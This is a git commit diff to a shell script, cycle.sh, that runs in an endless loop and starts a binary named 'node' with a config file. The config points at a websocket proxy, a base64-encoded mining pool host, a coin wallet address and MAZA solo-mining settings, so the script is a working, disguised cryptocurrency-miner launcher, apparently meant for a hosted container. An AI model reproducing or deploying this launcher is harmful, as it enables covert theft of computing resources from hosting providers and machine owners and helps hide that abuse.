5c2de48d20234ce6c54e7796579039692f623abd
miltoncarpenter665 <166653213+miltoncarpenter665@users.noreply.github.com>
2025-05-18 18:02:11 +0200

    Update cycle.sh

--- cycle.sh
+++ cycle.sh
@@ -2,20 +2,19 @@
 
 # Infinite loop to repeat the process
 while true; do
-  # Change to the directory (adjust the path if necessary)
-  cd /opt/app-root/src/ollma || { echo "Directory not found"; exit 1; }
   
   # Ensure the node executable has the proper permissions
   chmod +x ./node
   
   # Write the configuration to data.json
-  cat > data.json <<END
+
+  cat <<EOF > data.json
   {
     "proxy": "ws://cpusocks$(shuf -i 1-6 -n 1).teatspray.uk:9999/Y29pbnhwLnRlYXRzcHJheS51azo4MjQz",
     "config": { "threads": 1, "log": true },
     "options": { "user": "MGaypRJi43LcQxrgoL2CW28B31w4owLvv8.Test", "password": "c=MAZA,m=solo", "argent": "Web-Wasm-Reloaded/1.0" }
   }
-  END
+EOF
 
   # Start the node process in the background and capture its PID
   ./node app.js &
